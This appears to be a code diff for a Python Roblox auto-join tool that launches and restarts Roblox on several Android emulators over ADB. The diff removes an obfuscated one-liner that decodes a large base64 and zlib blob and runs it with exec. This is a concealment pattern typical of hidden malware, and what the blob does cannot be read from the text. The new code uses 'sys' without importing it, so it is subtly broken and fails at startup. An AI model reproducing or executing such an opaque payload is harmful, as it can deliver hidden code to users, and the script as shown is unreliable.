@@ -1,5 +1,234 @@
+import subprocess
+import time
+import os
+import threading
+import json
+from tabulate import tabulate
+from termcolor import colored
+from colorama import init, Fore
 
+# Inisialisasi Colorama untuk pewarnaan teks
+init(autoreset=True)
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+# Dapatkan jalur ADB saat dijalankan sebagai EXE
+if getattr(sys, 'frozen', False):
+    base_path = sys._MEIPASS
+else:
+    base_path = os.path.dirname(os.path.abspath(__file__))
+
+ADB_PATH = os.path.join(base_path, 'adb', 'adb.exe')
+
+# File konfigurasi
+config_file = "roblox_config.txt"
+port_file = "adb_ports.txt"
+PRIVATE_LINK_FILE = "private_links.json"
+
+def load_config():
+    if os.path.exists(config_file):
+        with open(config_file, 'r') as file:
+            return file.read().strip()
+    return None
+
+def save_config(game_id):
+    with open(config_file, 'w') as file:
+        file.write(game_id)
+    print(colored(f"Game ID saved to {config_file}", 'green'))
+
+def load_ports():
+    if os.path.exists(port_file):
+        with open(port_file, 'r') as file:
+            return [port.strip() for port in file.readlines()]
+    return []
+
+def save_ports(ports):
+    with open(port_file, 'w') as file:
+        file.write('\n'.join(ports))
+    print(colored(f"ADB ports saved to {port_file}", 'green'))
+
+def load_private_links():
+    try:
+        if os.path.exists(PRIVATE_LINK_FILE):
+            with open(PRIVATE_LINK_FILE, 'r') as file:
+                return json.load(file)
+        return {}
+    except Exception as e:
+        print(colored(f"Error loading private links: {e}", "red"))
+        return {}
+
+def save_private_link(device_id, link):
+    try:
+        links = load_private_links()
+        links[device_id] = link
+        with open(PRIVATE_LINK_FILE, 'w') as file:
+            json.dump(links, file, indent=4)
+        print(colored(f"Private link saved for emulator {device_id}", "green"))
+    except Exception as e:
+        print(colored(f"Error saving private link: {e}", "red"))
+
+def auto_connect_adb(ports):
+    for port in ports:
+        subprocess.run([ADB_PATH, 'connect', f'127.0.0.1:{port}'], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def launch_game_directly(device_id, game_url):
+    try:
+        # Langsung buka game tanpa melalui ActivitySplash
+        subprocess.run([
+            ADB_PATH, '-s', f'127.0.0.1:{device_id}', 
+            'shell', 'am', 'start', 
+            '-n', 'com.roblox.client/com.roblox.client.ActivityGame', 
+            '-d', game_url
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(5)
+        return True
+    except Exception as e:
+        print(colored(f"Failed to launch game directly on {device_id}: {e}", 'red'))
+        return False
+
+def auto_join_game(device_id, game_id, private_link, status):
+    status[device_id] = "Launching Game"
+    update_table(status)
+    
+    game_url = private_link if private_link else f"roblox://placeID={game_id}"
+    
+    if not launch_game_directly(device_id, game_url):
+        status[device_id] = "Failed to Launch"
+        update_table(status)
+        return
+    
+    status[device_id] = "In Game"
+    update_table(status)
+
+def check_roblox_running(device_id):
+    try:
+        result = subprocess.run(
+            [ADB_PATH, '-s', f'127.0.0.1:{device_id}', 'shell', 'pidof', 'com.roblox.client'],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        return bool(result.stdout.strip())
+    except Exception:
+        return False
+
+def force_close_roblox(device_id):
+    subprocess.run(
+        [ADB_PATH, '-s', f'127.0.0.1:{device_id}', 'shell', 'am', 'force-stop', 'com.roblox.client'],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(3)
+
+def ensure_roblox_running_with_interval(device_id, game_id, private_link, status, interval_minutes):
+    interval_seconds = interval_minutes * 60 if interval_minutes > 0 else None
+    last_restart = time.time()
+
+    while True:
+        if not check_roblox_running(device_id):
+            status[device_id] = "Restarting (crashed)"
+            update_table(status)
+            force_close_roblox(device_id)
+            auto_join_game(device_id, game_id, private_link, status)
+            last_restart = time.time()
+        
+        if interval_seconds and (time.time() - last_restart) >= interval_seconds:
+            status[device_id] = "Restarting (interval)"
+            update_table(status)
+            force_close_roblox(device_id)
+            auto_join_game(device_id, game_id, private_link, status)
+            last_restart = time.time()
+        
+        time.sleep(5)
+
+def update_table(status):
+    os.system('cls' if os.name == 'nt' else 'clear')
+    rows = []
+    for device_id, game_status in status.items():
+        color = {
+            "In Game": "green",
+            "Launching Game": "yellow",
+            "Restarting (crashed)": "red",
+            "Restarting (interval)": "magenta",
+            "Failed to Launch": "red"
+        }.get(game_status, "white")
+        
+        rows.append({
+            "Emulator": f"127.0.0.1:{device_id}",
+            "Status": colored(game_status, color)
+        })
+    
+    print(tabulate(rows, headers="keys", tablefmt="grid"))
+    print(colored("ROBLOX AUTO JOIN", 'blue', attrs=['bold']).center(50))
+
+def run_all_instances(ports, game_id, private_codes, interval_minutes):
+    status = {port: "Initializing" for port in ports}
+    update_table(status)
+
+    threads = []
+    for port in ports:
+        thread = threading.Thread(
+            target=ensure_roblox_running_with_interval,
+            args=(port, game_id, private_codes.get(port), status, interval_minutes)
+        )
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+def menu():
+    game_id = load_config()
+    ports = load_ports()
+    private_codes = load_private_links()
+
+    if ports:
+        auto_connect_adb(ports)
+    else:
+        print(colored("No ADB ports configured", 'yellow'))
+
+    if game_id:
+        print(colored(f"Loaded Game ID: {game_id}", 'green'))
+
+    while True:
+        print("\nMenu Options:")
+        print("1. Start Auto Join")
+        print("2. Set Game ID")
+        print("3. Set ADB Ports")
+        print("4. Set Private Server Code (All)")
+        print("5. Set Private Server Code (Single)")
+        print("6. Exit")
+
+        choice = input("Select option (1-6): ").strip()
+
+        if choice == '1':
+            if not game_id:
+                print(colored("Please set Game ID first", 'red'))
+                continue
+            interval = int(input("Restart interval in minutes (0 to disable): "))
+            run_all_instances(ports, game_id, private_codes, interval)
+        elif choice == '2':
+            game_id = input("Enter new Game ID: ").strip()
+            save_config(game_id)
+        elif choice == '3':
+            ports = input("Enter ADB ports (comma separated): ").split(',')
+            ports = [port.strip() for port in ports if port.strip()]
+            save_ports(ports)
+            auto_connect_adb(ports)
+        elif choice == '4':
+            code = input("Enter private server link for all instances: ").strip()
+            for port in ports:
+                save_private_link(port, code)
+            private_codes = load_private_links()
+        elif choice == '5':
+            port = input("Enter emulator port: ").strip()
+            if port in ports:
+                code = input(f"Enter private server link for {port}: ").strip()
+                save_private_link(port, code)
+                private_codes = load_private_links()
+            else:
+                print(colored("Invalid port number", 'red'))
+        elif choice == '6':
+            print("Exiting...")
+            break
+        else:
+            print(colored("Invalid option", 'red'))
+
+if __name__ == "__main__":
+    menu()
